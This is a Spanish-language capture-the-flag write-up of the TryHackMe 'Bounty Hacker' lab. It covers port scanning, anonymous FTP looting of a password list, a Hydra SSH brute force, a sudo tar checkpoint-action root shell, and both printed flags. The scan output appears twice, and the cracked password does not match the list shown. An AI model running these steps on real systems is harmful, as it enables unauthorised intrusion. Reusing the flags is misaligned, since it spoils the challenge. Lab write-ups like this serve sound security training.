# Writeup Bounty Hacker - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.128.176.157 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---


## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.128.176.157 -oN scan_bounty.txt
```

### Resultados del Escaneo


```bash
Nmap scan report for 10.128.176.157
Host is up (0.048s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.81
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ce:6a:99:92:30:de:b6:e2:19:4e:d7:9f:37:ae:e8:91 (RSA)
|   256 21:2f:0d:86:20:60:91:c5:55:40:c7:55:7d:60:ac:7d (ECDSA)
|_  256 3c:92:fe:fa:96:5c:91:5e:33:ce:a0:f5:8b:44:df:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelNmap scan report for 10.128.176.157
Host is up (0.048s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.81
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ce:6a:99:92:30:de:b6:e2:19:4e:d7:9f:37:ae:e8:91 (RSA)
|   256 21:2f:0d:86:20:60:91:c5:55:40:c7:55:7d:60:ac:7d (ECDSA)
|_  256 3c:92:fe:fa:96:5c:91:5e:33:ce:a0:f5:8b:44:df:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


Podemos ver que hay tres puertos abiertos, el 21 (FTP), el 22 (SSH) y el 80 (HTTP). Vamos a empezar por el puerto 21, ya que es un servicio que a veces tiene vulnerabilidades, y al parecer hay acceso anónimo al servicio.

---

## Enumeración

Al entrar en el servicio FTP, podemos ver que se han encontrado dos archivos, "locks.txt" y "task.txt", por lo que los descargaremos para ver que hay en ellos.

![ftp](/imgBounty/image2.png)


```bash
cat locks.txt     
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
```

```bash
cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Podemos ver que en el primer archivo es una lista de contraseñas, y en el segundo archivo, es una lista de tareas a seguir, y en la última línea se puede ver que hay un usuario llamado "lin", y al parecer estos archivos serían para entrar a la fuerza al servicio ssh del usuario "lin". 
---

## Explotación

Para ello usaremos la vieja confiable en la mayoría de máquinas: Hydra.

![hydra](/imgBounty/image3.png)

```bash
[22][ssh] host: 10.128.176.157   login: lin   password: RedDr4gonSynd1cat3
```

¡Tenemos el login del usuario lin!. Vamos a entrar por SSH y obtener la flag de usuario:

```bash
ssh lin@10.128.176.157
lin@ip-10-128-176-157:~/Desktop$ ls
user.txt
lin@ip-10-128-176-157:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

---

## Escalada de Privilegios

Ahora, buscaremos la forma de subir de privilegios en el sistema para tener la shell de root. Para ello, usaremos la vieja confiable: `sudo -l`, para saber que comandos podemos ejecutar sin necesidad de contraseña.

![sudo](/imgBounty/image4.png)

Podemos ver que podemos correr como root /bin/tar, así que usaremos GTFObins para encontrar el comando a usar para elevar de privilegios en el sistema.


![GTFObins](/imgBounty/image.png)

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

```

¡Boom! Tenemos acceso root a la máquina. Ahora tendremos acceso a la flag de root.

![root](/imgBounty/image5.png)

---

## Flags

- **User Flag**: THM{CR1M3_SyNd1C4T3}
- **Root Flag**: THM{80UN7Y_h4cK3r}
